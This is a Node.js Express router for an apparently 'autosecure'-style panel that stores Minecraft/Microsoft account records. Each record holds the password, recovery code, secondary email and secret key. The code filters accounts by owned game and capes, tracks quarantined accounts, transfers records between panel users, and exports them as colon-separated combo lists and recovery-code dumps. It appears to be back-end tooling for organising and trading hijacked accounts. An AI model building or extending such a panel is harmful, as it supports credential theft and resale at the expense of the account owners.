const express = require('express');
const router = express.Router();
const { query, get, run } = require('../db');
const { insertAccountRecord } = require('../services/secureService');

router.get('/', (req, res) => {
  try {
    const userId = req.user.id;
    const isAdmin = req.user.isAdmin;
    const {
      search = '',
      filter = 'all',
      sort = 'time_desc',
      page = 1,
      limit = 20,
      scope = 'user'
    } = req.query;

    const pageNum = Math.max(1, parseInt(page, 10) || 1);
    const limitNum = Math.min(100, Math.max(5, parseInt(limit, 10) || 20));
    const offset = (pageNum - 1) * limitNum;

    const conditions = [];
    const params = [];

    // Filter by ownership unless admin explicitly requests all accounts
    if (!isAdmin || scope !== 'all') {
      conditions.push('(a.user_id = ? OR u.user_id = ?)');
      params.push(userId, userId);
    }

    if (search.trim()) {
      const term = `%${search.trim()}%`;
      conditions.push('(a.username LIKE ? OR a.email LIKE ? OR a.uid LIKE ? OR a.recoverycode LIKE ?)');
      params.push(term, term, term, term);
    }

    if (filter === 'mc') {
      conditions.push("(a.ownsmc IS NOT NULL AND a.ownsmc != 'No MC' AND a.ownsmc NOT LIKE '%Failed%')");
    } else if (filter === 'capes') {
      conditions.push("(a.capes IS NOT NULL AND a.capes != 'None' AND a.capes != '' AND a.capes != '[]')");
    } else if (filter === 'nomc') {
      conditions.push("(a.ownsmc = 'No MC' OR a.ownsmc LIKE '%Failed%')");
    }

    const whereClause = conditions.length ? `WHERE ${conditions.join(' AND ')}` : '';

    let orderBy = 'ORDER BY a.id DESC';
    if (sort === 'time_asc') orderBy = 'ORDER BY a.id ASC';
    else if (sort === 'username_asc') orderBy = 'ORDER BY a.username ASC';
    else if (sort === 'username_desc') orderBy = 'ORDER BY a.username DESC';

    // Count total matches
    const countSql = `
      SELECT COUNT(DISTINCT a.uid) as total
      FROM accounts a
      LEFT JOIN accountsbyuser u ON a.uid = u.uid
      ${whereClause}
    `;
    const countRow = get(countSql, params);
    const total = countRow?.total || 0;

    // Fetch paginated rows
    const querySql = `
      SELECT DISTINCT 
        a.id, a.uid, a.user_id, a.username, a.ownsmc, a.capes, 
        a.email, a.recoverycode, a.secemail, a.secretkey, a.password, 
        a.stats_id, a.time,
        (SELECT COUNT(*) FROM quarantine q WHERE q.uuid = a.uid OR q.name = a.username) as is_quarantined
      FROM accounts a
      LEFT JOIN accountsbyuser u ON a.uid = u.uid
      ${whereClause}
      ${orderBy}
      LIMIT ? OFFSET ?
    `;

    const accounts = query(querySql, [...params, limitNum, offset]);

    res.json({
      success: true,
      data: {
        accounts,
        pagination: {
          page: pageNum,
          limit: limitNum,
          total,
          totalPages: Math.ceil(total / limitNum)
        }
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

router.get('/:uid', (req, res) => {
  try {
    const { uid } = req.params;
    const account = get('SELECT * FROM accounts WHERE uid = ?', [uid]);

    if (!account) {
      return res.status(404).json({ success: false, error: 'Account not found' });
    }

    // Permission check
    if (!req.user.isAdmin && account.user_id !== req.user.id) {
      const owned = get('SELECT 1 FROM accountsbyuser WHERE uid = ? AND user_id = ?', [uid, req.user.id]);
      if (!owned) {
        return res.status(403).json({ success: false, error: 'Access denied to this account' });
      }
    }

    const extra = get('SELECT * FROM extrainformation WHERE uid = ?', [uid]);
    const status = get('SELECT * FROM status WHERE uid = ?', [uid]);
    const quarantined = get('SELECT * FROM quarantine WHERE uuid = ? OR name = ?', [uid, account.username]);

    let parsedStats = null;
    if (account.stats_id && account.stats_id !== 'null') {
      try {
        parsedStats = JSON.parse(account.stats_id);
      } catch (e) {}
    }

    res.json({
      success: true,
      data: {
        ...account,
        stats: parsedStats,
        extra: extra || null,
        status: status || null,
        quarantine: quarantined || null
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Manual account creation
router.post('/', async (req, res) => {
  try {
    const userId = req.user.id;
    const { username, email, password, recoverycode, secemail, secretkey, ownsmc, capes } = req.body;

    if (!email) {
      return res.status(400).json({ success: false, error: 'Email address is required' });
    }

    const result = await insertAccountRecord({
      username: username || 'Player',
      email,
      password: password || '',
      recoverycode: recoverycode || 'N/A',
      secemail: secemail || 'None',
      secretkey: secretkey || 'Disabled',
      ownsmc: ownsmc || 'Purchased',
      capes: capes || 'None'
    }, userId);

    res.json({ success: true, message: 'Account successfully registered', uid: result.uid });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Transfer/Move account
router.post('/:uid/move', (req, res) => {
  try {
    const { uid } = req.params;
    const { targetUserId } = req.body;

    if (!targetUserId) {
      return res.status(400).json({ success: false, error: 'targetUserId is required' });
    }

    const account = get('SELECT * FROM accounts WHERE uid = ?', [uid]);
    if (!account) return res.status(404).json({ success: false, error: 'Account not found' });

    if (!req.user.isAdmin && account.user_id !== req.user.id) {
      return res.status(403).json({ success: false, error: 'Unauthorized to move this account' });
    }

    run('UPDATE accounts SET user_id = ? WHERE uid = ?', [targetUserId, uid]);
    run('UPDATE accountsbyuser SET user_id = ? WHERE uid = ?', [targetUserId, uid]);

    res.json({ success: true, message: `Account transferred to user ${targetUserId}` });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Delete single account
router.delete('/:uid', (req, res) => {
  try {
    const { uid } = req.params;
    const account = get('SELECT * FROM accounts WHERE uid = ?', [uid]);

    if (!account) return res.status(404).json({ success: false, error: 'Account not found' });

    if (!req.user.isAdmin && account.user_id !== req.user.id) {
      return res.status(403).json({ success: false, error: 'Unauthorized to delete this account' });
    }

    run('DELETE FROM accounts WHERE uid = ?', [uid]);
    run('DELETE FROM accountsbyuser WHERE uid = ?', [uid]);
    run('DELETE FROM extrainformation WHERE uid = ?', [uid]);
    run('DELETE FROM status WHERE uid = ?', [uid]);

    res.json({ success: true, message: 'Account deleted' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Delete all accounts
router.delete('/', (req, res) => {
  try {
    const userId = req.user.id;
    const isAdmin = req.user.isAdmin;
    const { scope = 'user' } = req.query;

    if (isAdmin && scope === 'all') {
      run('DELETE FROM accounts');
      run('DELETE FROM accountsbyuser');
      run('DELETE FROM extrainformation');
      run('DELETE FROM status');
      return res.json({ success: true, message: 'All accounts in database deleted' });
    }

    const userUids = query('SELECT uid FROM accountsbyuser WHERE user_id = ?', [userId]).map(r => r.uid);

    for (const uid of userUids) {
      run('DELETE FROM accounts WHERE uid = ?', [uid]);
      run('DELETE FROM accountsbyuser WHERE uid = ?', [uid]);
      run('DELETE FROM extrainformation WHERE uid = ?', [uid]);
      run('DELETE FROM status WHERE uid = ?', [uid]);
    }

    res.json({ success: true, message: `Deleted ${userUids.length} accounts` });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Export accounts (Text / JSON / CSV)
router.get('/export/download', (req, res) => {
  try {
    const userId = req.user.id;
    const isAdmin = req.user.isAdmin;
    const { format = 'txt', scope = 'user' } = req.query;

    let sql = 'SELECT * FROM accounts WHERE user_id = ? ORDER BY id DESC';
    let params = [userId];

    if (isAdmin && scope === 'all') {
      sql = 'SELECT * FROM accounts ORDER BY id DESC';
      params = [];
    }

    const rows = query(sql, params);

    if (format === 'json') {
      res.setHeader('Content-Type', 'application/json');
      res.setHeader('Content-Disposition', 'attachment; filename="autosecure_accounts.json"');
      return res.send(JSON.stringify(rows, null, 2));
    }

    if (format === 'csv') {
      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition', 'attachment; filename="autosecure_accounts.csv"');
      let csv = 'UID,Username,Email,Password,RecoveryCode,SecondaryEmail,SecretKey,OwnsMC,Capes,Time\n';
      for (const r of rows) {
        csv += `"${r.uid}","${r.username}","${r.email}","${r.password}","${r.recoverycode}","${r.secemail}","${r.secretkey}","${r.ownsmc}","${r.capes}","${r.time}"\n`;
      }
      return res.send(csv);
    }

    // Default formatted TXT: user:mc:capes:rec:email:sec:key:pass
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', 'attachment; filename="autosecure_accounts.txt"');
    let text = '';
    for (const r of rows) {
      text += `${r.username || ''}:${r.ownsmc || ''}:${r.capes || ''}:${r.recoverycode || ''}:${r.email || ''}:${r.secemail || ''}:${r.secretkey || ''}:${r.password || ''}\n`;
    }
    res.send(text);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Export recovery codes list
router.get('/export/recovery-codes', (req, res) => {
  try {
    const userId = req.user.id;
    const isAdmin = req.user.isAdmin;
    const { scope = 'user' } = req.query;

    let sql = 'SELECT email, recoverycode FROM accounts WHERE user_id = ? AND recoverycode IS NOT NULL AND recoverycode != "N/A"';
    let params = [userId];

    if (isAdmin && scope === 'all') {
      sql = 'SELECT email, recoverycode FROM accounts WHERE recoverycode IS NOT NULL AND recoverycode != "N/A"';
      params = [];
    }

    const rows = query(sql, params);
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', 'attachment; filename="recovery_codes.txt"');
    const text = rows.map(r => `${r.email} -> ${r.recoverycode}`).join('\n');
    res.send(text);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

module.exports = router;
